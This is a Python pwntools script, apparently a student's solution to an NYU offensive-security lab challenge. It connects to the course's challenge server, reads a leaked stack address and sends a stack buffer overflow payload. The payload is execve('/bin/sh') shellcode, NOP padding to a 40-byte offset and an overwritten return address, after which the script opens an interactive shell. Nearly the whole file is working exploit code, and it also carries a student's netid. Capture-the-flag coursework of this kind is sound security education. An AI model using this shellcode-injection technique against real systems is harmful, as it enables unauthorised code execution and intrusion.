#!/usr/bin/env python3

from pwn import *

#context.log_level = "DEBUG"

# Offset to overwrite return address
OFFSET = 40

# Local instance for local testing:
'''s = process("./school.htm")
g = gdb.attach(s, gdbscript="""
	b *(main+56)
	b *(main+80)
	c
	x/40x $rsp
	""",
)'''

# Open connection to challenge
s = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1338)

# Wait until prompted for NYU netid and send it
s.recvuntil(b"something like abc123): ")
s.send(b"aal562\n")

# Receive directions to school
direction_request = s.recvuntil(b"directions:")
request_decode = direction_request.decode("utf-8")

# Pull the school address from the entire message and convert to "\x00" inline format
position = request_decode.find("0x")
address = request_decode[position:position + 14]
int_addr = int(address, 16)
addr_for_payload = p64(int_addr, endian='little')

# Assmebly code taken from week 8 slides, assembled inline format from https://shell-storm.org/online/Online-Assembler-and-Disassembler/
shell = b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"

# Identify how many "filler" bytes to include after shell code to reach the offset
offset = OFFSET - len(shell)

#Create payload in the following format: shell code, nop instructions "\x90" until offset is reached, address to point back to shellcode for execution
payload = b"".join(
	[
		shell,
		b"\x90" * offset,
		addr_for_payload,
		b"\n",
	]
)

# Send our payload
s.send(payload)

# Make the session interactive to interact with our shell
s.interactive()
